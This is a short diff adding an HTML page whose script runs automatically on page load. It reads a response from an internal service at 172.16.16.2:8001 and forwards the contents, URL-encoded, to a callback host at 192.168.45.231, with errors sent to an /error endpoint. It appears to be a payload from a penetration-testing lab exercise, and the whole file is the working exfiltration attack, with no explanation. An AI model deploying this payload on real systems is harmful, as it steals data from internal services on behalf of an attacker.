@@ -1,0 +1,18 @@
+<html>
+<head>
+<script>
+function exfiltrate() {
+	fetch("http://172.16.16.2:8001")
+	.then((response) => response.text())
+	.then((data) => {
+		fetch("http://192.168.45.231/callback?" + encodeURIComponent(data));
+	}).catch(err => {
+		fetch("http://192.168.45.231/error?" + encodeURIComponent(err));
+	});
+}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>
